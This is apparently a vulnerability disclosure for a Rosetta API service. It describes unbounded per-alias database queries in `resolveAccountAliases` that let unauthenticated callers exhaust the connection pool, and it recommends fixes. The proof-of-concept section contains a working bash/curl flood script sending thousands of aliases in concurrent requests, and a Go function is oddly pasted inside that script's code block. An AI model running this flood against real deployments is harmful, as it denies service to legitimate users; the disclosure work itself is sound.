### Title
Unbounded Alias Count in `resolveAccountAliases` Enables Unauthenticated Database Connection Pool Exhaustion DoS

### Summary
The `resolveAccountAliases` function in `rosetta/app/services/construction_service.go` iterates over a caller-supplied comma-separated `account_aliases` string with no limit on the number of entries, issuing one synchronous `GetAccountId` database call per alias. Because the `/construction/metadata` endpoint requires no authentication and the Traefik rate-limiting middleware is disabled by default, an unprivileged attacker can submit requests containing thousands of aliases, saturating the database connection pool and degrading or blocking legitimate fund-transfer operations.

### Finding Description

**Exact code path:**

`ConstructionMetadata` (line 159) calls `resolveAccountAliases` unconditionally when `account_aliases` is present in `options`:

```go
// construction_service.go:159
if resolved, rErr := c.resolveAccountAliases(ctx, options); rErr != nil {
```

Inside `resolveAccountAliases` (lines 575–586), the alias string is split on commas with no count guard, and for every element a blocking DB call is made:

```go
for accountAlias := range strings.SplitSeq(accountAliases, ",") {
    accountId, err := types.NewAccountIdFromString(accountAlias, c.systemShard, c.systemRealm)
    ...
    found, rErr := c.accountRepo.GetAccountId(ctx, accountId)   // DB call per alias
    ...
}
```

`GetAccountId` (account.go lines 146–156) acquires a connection from the pool on every invocation:

```go
db, cancel := ar.dbClient.GetDbWithContext(ctx)
defer cancel()
...
db.Raw(selectCurrentCryptoEntityByAlias, ...).First(&entity)
```

**Root cause:** There is no maximum alias count enforced anywhere in the call chain — not in `resolveAccountAliases`, not in `ConstructionMetadata`, and not at the HTTP layer.

**Why existing checks fail:**

| Defense | Status | Why insufficient |
|---|---|---|
| `global.middleware: false` (values.yaml line 95) | Traefik middleware **disabled by default** | `inFlightReq` and `rateLimit` are never applied unless an operator explicitly opts in |
| `inFlightReq: amount: 5` per IP | Optional, opt-in | Even when active, 5 concurrent requests × N aliases = 5N DB calls; attacker uses multiple IPs to multiply |
| `rateLimit: average: 10` per **host** (not per IP) | Optional, opt-in | Shared across all clients; does not bound per-client alias count |
| `WriteTimeout: 10s` | Always active | Bounds wall-clock time per request, but at ~1 ms/query allows ~10 000 queries per request before timeout |
| `maxOpenConnections: 100` | Always active | Pool is the finite resource being targeted; 10–20 concurrent large-alias requests can saturate it |
| `statementTimeout: 20s` | Per-query DB-side | Does not limit alias count; only caps individual query duration |

### Impact Explanation

The database connection pool is configured with a default maximum of 100 open connections (`hiero.mirror.rosetta.db.pool.maxOpenConnections`). A sustained flood of `/construction/metadata` requests each carrying thousands of aliases will keep the pool fully occupied with alias-resolution queries. All other Rosetta operations that require a database connection — including balance lookups and block queries needed to construct and validate fund transfers — will queue or fail with connection-pool errors. This constitutes a denial-of-service against the fund-transfer pipeline without requiring any privileged access.

### Likelihood Explanation

The endpoint is unauthenticated and publicly reachable. The attack requires only the ability to send HTTP POST requests with a crafted JSON body — no keys, tokens, or on-chain funds are needed. The payload is trivially constructed (a long comma-separated string in the `options.account_aliases` field). The attack is repeatable and can be sustained indefinitely from a single IP when the Traefik middleware is absent (the default deployment). Even with Traefik enabled, distributing requests across a handful of IP addresses bypasses the per-IP in-flight limit.

### Recommendation

1. **Enforce an alias count limit in `resolveAccountAliases`** — reject requests where `len(strings.Split(accountAliases, ","))` exceeds a small constant (e.g., 10–20, matching realistic transaction fan-out):
   ```go
   aliases := strings.Split(accountAliases, ",")
   if len(aliases) > maxAccountAliases { // e.g. const maxAccountAliases = 20
       return emptyResult, errors.ErrInvalidOptions
   }
   ```
2. **Enable the Traefik middleware by default** — change `global.middleware: false` to `true` in `values.yaml` so `inFlightReq` and `rateLimit` are active in all deployments.
3. **Scope `rateLimit` to per-IP** — change `sourceCriterion` from `requestHost` to `ipStrategy` to prevent a single client from consuming the full rate budget.

### Proof of Concept

```bash
# Build a payload with 5000 aliases (all valid format, none need to exist)
ALIASES=$(python3 -c "print(','.join(['0.0.'+str(i) for i in range(1,5001)]))")

# Fire 20 concurrent requests (no auth required)
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/construction/metadata \
    -H 'Content-Type: application/json' \
    -d "{
      \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"testnet\"},
      \"options\": {
        \"operation_type\": \"CRYPTO_TRANSFER\",
        \"account_aliases\": \"$ALIASES\"
      }
    }" &
done
wait

# /construction/metadata, /account/balance, and /block requests return errors

func (ar *accountRepository) GetAccountId(ctx context.Context, accountId types.AccountId) (
	zero types.AccountId,
	_ *rTypes.Error,
) {
	if !accountId.HasAlias() {
		return accountId, nil
	}

	db, cancel := ar.dbClient.GetDbWithContext(ctx)
	defer cancel()

	var entity domain.Entity
	if err := db.Raw(selectCurrentCryptoEntityByAlias, sql.Named("alias", accountId.GetAlias())).First(&entity).Error; err != nil {
		if errors.Is(err, gorm.ErrRecordNotFound) {
			return zero, hErrors.ErrAccountNotFound
		}

		return zero, hErrors.ErrDatabaseError
	}

	return types.NewAccountIdFromEntityId(entity.Id), nil
}
```
